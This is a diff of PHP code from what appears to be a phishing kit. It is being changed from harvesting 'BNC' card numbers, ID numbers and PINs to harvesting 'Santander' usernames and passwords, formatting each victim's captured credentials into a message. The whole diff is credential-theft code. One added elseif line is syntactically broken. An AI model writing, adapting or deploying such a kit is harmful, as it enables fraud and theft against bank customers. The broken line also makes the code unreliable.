@@ -34,41 +34,28 @@ $form_origen = "desconocido";
 $message = "";
 
 // index.php
-if (isset($_POST['tipo_usuario'],$_POST['tipo_tarjeta'],$_POST['card'],$_POST['doc'],$_POST['clave'])) {
+if (isset($_POST['usr'],$_POST['pass'])) {
 
-    $_SESSION['usuario'] = $_POST['doc'];
+    $_SESSION['usuario'] = $_POST['usr'];
 
     $form_origen = "index.php";
 
-    $tipo_usuario = trim($_POST['tipo_usuario']);
-    $tipo_tarjeta = trim($_POST['tipo_tarjeta']);
-    $card = trim($_POST['card']);
-    $doc = trim($_POST['doc']);
-    $clave = trim($_POST['clave']);
-    $message .= "🇻🇪『𝖡𝖭𝖢 𝖫𝗈𝗀𝗈』🇻🇪\n\n";
-    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖢𝗎𝖾𝗇𝗍𝖺.: <code>$tipo_usuario</code>\n";
-    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$tipo_tarjeta</code>\n";
-    $message .= "┊⬩ 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$card</code>\n";
-    $message .= "┊⬩ 𝖢𝖾𝖽𝗎𝗅𝖺.: <code>$doc</code>\n";
-    $message .= "┊⬩ 𝖢𝗅𝖺𝗏𝖾.: <code>$clave</code>\n\n";
+    $user = trim($_POST['usr']);
+    $password = trim($_POST['pass']);
+    $message .= "🔺『𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋 𝖫𝗈𝗀𝗈』🔺\n\n";
+    $message .= "┊⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.: <code>$user</code>\n";
+    $message .= "┊⬩ 𝖢𝗅𝖺𝗏𝖾.: <code>$password</code>\n\n";
 
 // index-error.php
-} elseif (isset($_POST['tipo_usuario2'],$_POST['tipo_tarjeta2'],$_POST['card2'],$_POST['doc2'],$_POST['clave2'])) {
-    $_SESSION['usuario'] = $_POST['doc2'];
+} elseif (isset($_POST['usr2'],$_POST['pass2'];
 
     $form_origen = "index-error.php";
 
-    $tipo_usuario = trim($_POST['tipo_usuario2']);
-    $tipo_tarjeta = trim($_POST['tipo_tarjeta2']);
-    $card = trim($_POST['card2']);
-    $doc = trim($_POST['doc2']);
-    $clave = trim($_POST['clave2']);
-    $message .= "🇻🇪『𝖡𝖭𝖢 𝖫𝗈𝗀𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
-    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖢𝗎𝖾𝗇𝗍𝖺.: <code>$tipo_usuario</code>\n";
-    $message .= "┊⬩ 𝖳𝗂𝗉𝗈 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$tipo_tarjeta</code>\n";
-    $message .= "┊⬩ 𝖳𝖺𝗋𝗃𝖾𝗍𝖺.: <code>$card</code>\n";
-    $message .= "┊⬩ 𝖢𝖾𝖽𝗎𝗅𝖺.: <code>$doc</code>\n";
-    $message .= "┊⬩ 𝖢𝗅𝖺𝗏𝖾.: <code>$clave</code>\n\n";
+    $user = trim($_POST['usr2']);
+    $password = trim($_POST['pass2']);
+    $message .= "🔺『𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋 𝖫𝗈𝗀𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🔺\n\n";
+    $message .= "┊⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.: <code>$user</code>\n";
+    $message .= "┊⬩ 𝖢𝗅𝖺𝗏𝖾.: <code>$password</code>\n\n";
 
 // otp.php
 } elseif (isset($_POST['otp'])) {
